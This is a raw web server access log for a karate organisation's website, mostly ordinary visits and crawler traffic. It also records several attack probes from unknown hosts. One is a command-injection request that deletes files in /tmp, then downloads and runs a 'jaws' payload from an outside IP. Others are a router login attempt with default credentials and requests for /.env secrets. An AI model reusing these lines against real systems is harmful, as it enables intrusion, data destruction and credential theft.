::ffff:198.235.24.21 - - [22/Nov/2022:00:00:29 +0000] "GET / HTTP/1.1" 200 57378 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:87.236.176.120 - - [22/Nov/2022:00:01:07 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
::ffff:87.236.176.227 - - [22/Nov/2022:00:01:08 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
::ffff:4.4.66.84 - - [22/Nov/2022:00:04:47 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+91.122.37.169/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:157.55.39.214 - - [22/Nov/2022:00:09:50 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 200 3442 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:54.36.148.210 - - [22/Nov/2022:00:16:23 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [22/Nov/2022:00:16:25 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:37.139.53.82 - - [22/Nov/2022:00:17:29 +0000] "GET / HTTP/1.0" 200 57378 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4089.0 Safari/537.36"
::ffff:37.139.53.82 - - [22/Nov/2022:00:17:30 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4089.0 Safari/537.36"
::ffff:37.139.53.82 - - [22/Nov/2022:00:17:30 +0000] "GET /?err=error HTTP/1.0" 200 57930 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4089.0 Safari/537.36"
::ffff:113.22.58.54 - - [22/Nov/2022:00:23:56 +0000] "GET /status HTTP/1.1" 404 145 "-" "okhttp/3.14.9"
::ffff:175.107.0.113 - - [22/Nov/2022:00:28:44 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 162 "-" "-"
::ffff:54.36.149.19 - - [22/Nov/2022:00:32:42 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.1 - - [22/Nov/2022:00:32:43 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:68.69.184.202 - - [22/Nov/2022:00:47:31 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "test"
::ffff:68.69.184.202 - - [22/Nov/2022:00:47:31 +0000] "GET / HTTP/1.1" 200 57378 "-" "test"
::ffff:203.10.99.204 - - [22/Nov/2022:00:51:28 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:51.222.253.16 - - [22/Nov/2022:00:51:36 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [22/Nov/2022:00:51:38 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:203.189.153.44 - - [22/Nov/2022:00:51:53 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:205.210.31.9 - - [22/Nov/2022:00:54:33 +0000] "GET / HTTP/1.1" 200 57378 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:157.55.39.214 - - [22/Nov/2022:00:55:05 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 200 3457 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:135.125.217.54 - - [22/Nov/2022:00:57:02 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [22/Nov/2022:00:57:02 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:203.10.99.204 - - [22/Nov/2022:00:59:48 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:159.223.59.75 - - [22/Nov/2022:01:02:29 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:05 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:06 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [22/Nov/2022:01:04:07 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:95.214.235.205 - - [22/Nov/2022:01:05:20 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [22/Nov/2022:01:05:21 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.220.149.10 - - [22/Nov/2022:01:06:29 +0000] "GET / HTTP/1.1" 200 57378 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:223.111.175.4 - - [22/Nov/2022:01:10:21 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 9_0) AppleWebKit/593.51 (KHTML, like Gecko) Chrome/106.0.1904 Safari/537.36"
::ffff:223.111.175.4 - - [22/Nov/2022:01:10:23 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 8_0_1; Win64; x64) AppleWebKit/597.52 (KHTML, like Gecko) Chrome/58.0.1502 Safari/537.36"
::ffff:223.111.175.4 - - [22/Nov/2022:01:10:24 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 8_1) AppleWebKit/589.47 (KHTML, like Gecko) Chrome/103.0.568 Safari/537.36"
::ffff:223.111.175.4 - - [22/Nov/2022:01:10:25 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 8_1) AppleWebKit/565.41 (KHTML, like Gecko) Chrome/85.0.765 Safari/537.36"
::ffff:223.111.175.4 - - [22/Nov/2022:01:10:25 +0000] "GET /sitemap.xml HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 9_0_1) AppleWebKit/576.44 (KHTML, like Gecko) Chrome/56.0.1325 Safari/537.36"
::ffff:51.222.253.8 - - [22/Nov/2022:01:13:29 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:157.55.39.214 - - [22/Nov/2022:01:14:47 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 200 7644 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:03 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:04 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:07 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:11 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:40 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:40 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:40 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:22:40 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://www.wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:20 +0000] "POST /sendemail HTTP/1.1" 302 80 "http://www.wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:21 +0000] "GET /contact/?msg=sent HTTP/1.1" 200 10420 "http://www.wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:21 +0000] "GET /contact/js/common.js HTTP/1.1" 404 159 "http://www.wadokikai.org/contact/?msg=sent" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:21 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/contact/?msg=sent" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:21 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/contact/?msg=sent" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:40.77.167.4 - - [22/Nov/2022:01:24:53 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:24:57 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:25:00 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:25:04 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:25:13 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:25:13 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:25:13 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:25:13 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://www.wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:26:33 +0000] "POST /sendemail HTTP/1.1" 302 80 "http://www.wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:26:33 +0000] "GET /contact/?msg=sent HTTP/1.1" 200 10420 "http://www.wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:26:34 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/contact/?msg=sent" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:26:34 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/contact/?msg=sent" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
::ffff:73.63.132.217 - - [22/Nov/2022:01:26:34 +0000] "GET /contact/js/common.js HTTP/1.1" 404 159 "http://www.wadokikai.org/contact/?msg=sent" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
